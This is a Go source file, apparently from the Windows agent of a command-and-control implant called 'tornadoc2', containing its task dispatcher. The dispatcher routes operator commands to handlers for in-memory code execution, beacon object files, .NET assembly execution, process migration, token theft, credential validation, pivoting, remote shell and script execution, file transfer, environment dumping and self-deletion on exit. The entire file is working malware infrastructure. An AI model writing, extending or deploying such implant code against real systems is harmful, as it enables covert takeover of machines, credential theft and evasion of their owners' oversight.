//go:build windows

package core

import (
	"context"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
	"tornadoc2/agent/native"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
)

func (a *Agent) execute(t protocol.Task) (res protocol.Result) {
	defer func() {
		if r := recover(); r != nil {
			res = protocol.Result{ID: t.ID,
				Error: fmt.Sprintf("verb %s panicked: %v",
					t.Verb, r)}
			diag("[exec] PANIC in %s: %v\n", t.Verb, r)
		}
	}()
	timeout := t.Timeout
	if timeout <= 0 {
		timeout = 60
	}
	diag("[exec] verb=%s timeout=%ds\n", t.Verb, timeout)
	ctx, cancel := context.WithTimeout(context.Background(),
		time.Duration(timeout)*time.Second)
	defer cancel()

	if isNativeExtraVerb(t.Verb) {
		diag("[exec] dispatching to native extra verb\n")
		return a.nativeExtraVerb(t)
	}

	if isExtensionVerb(t.Verb) {
		diag("[exec] dispatching to extension verb\n")
		switch t.Verb {
		case "extension_register":
			return a.extensionRegister(t)
		case "extension_call":
			return a.extensionCall(ctx, t)
		case "extension_list":
			return a.extensionList(t)
		case "extension_unload":
			return a.extensionUnload(t)
		}
	}

	diag("[exec] dispatching %q to builtin handler\n", t.Verb)
	switch t.Verb {
	case "exec":
		return a.execVerb(ctx, t)
	case "sh":
		return a.shVerb(ctx, t)
	case "pyexec":
		return a.pyexecVerb(ctx, t)
	case "psexec":
		return a.psexecVerb(ctx, t)
	case "shexec":
		return a.shexecVerb(ctx, t)
	case "truncate":
		return a.truncateVerb(t)
	case "writechunk":
		return a.writechunkVerb(t)
	case "readchunk":
		return a.readChunkVerb(t)
	case "filesize":
		return a.fileSizeVerb(t)
	case "sha256file":
		return a.sha256FileVerb(t)
	case "execmem":
		return a.execmemVerb(ctx, t)
	case "bof":
		return a.bofVerb(ctx, t)
	case "execute_assembly":
		return a.executeAssemblyVerb(ctx, t)
	case "pivot_connect":
		return a.pivotConnectVerb(ctx, t)
	case "pivot_close":
		return a.pivotCloseVerb(t)
	case "migrate":
		return a.migrateVerb(ctx, t)
	case "cred_validate":
		return a.credValidateVerb(ctx, t)
	case "steal_token":
		return a.stealTokenVerb(ctx, t)
	case "cat":
		return a.catVerb(t)
	case "ls":
		return a.lsVerb(t)
	case "pwd":
		return a.simpleVerb(t, []byte(mustGetwd()))
	case "whoami":
		if len(t.Args) > 0 && t.Args[0] == "/priv" {
			if !supportsTokens {
				return protocol.Result{ID: t.ID,
					Error: "whoami /priv is only available on " +
						"Windows (no token model on Linux)"}
			}
			out, err := native.NativeWhoamiPriv(t)
			if err != nil {
				return protocol.Result{ID: t.ID,
					Error: err.Error()}
			}
			return protocol.Result{ID: t.ID,
				Output: encodeOutput([]byte(out))}
		}
		return a.simpleVerb(t, []byte(a.identity.Username))
	case "hostname":
		return a.simpleVerb(t, []byte(a.identity.Hostname))
	case "uname":
		return a.simpleVerb(t,
			[]byte(fmt.Sprintf("%s %s", platformName, runtime.GOARCH)))
	case "env":
		return a.simpleVerb(t, []byte(strings.Join(os.Environ(), "\n")))
	case "ps":
		return a.psVerb(t)
	case "id":
		return a.idVerb(t)
	case "readfile":
		return a.catVerb(t)
	case "sleep":
		return a.sleepVerb(t)
	case "workhours":
		return a.workhoursVerb(t)
	case "spawnto":
		return a.spawntoVerb(t)
	case "kill", "exit":
		diag("[exec] self-destruct requested\n")
		closeStolenTokenOnExit()
		go func() {
			time.Sleep(time.Second)
			_ = platform.SelfDelete()
			os.Exit(0)
		}()
		return protocol.Result{
			ID:     t.ID,
			Output: encodeOutput([]byte("terminating\n")),
		}
	}
	diag("[exec] unknown verb %q\n", t.Verb)
	return protocol.Result{
		ID:    t.ID,
		Error: fmt.Sprintf("unknown verb: %s", t.Verb),
	}
}
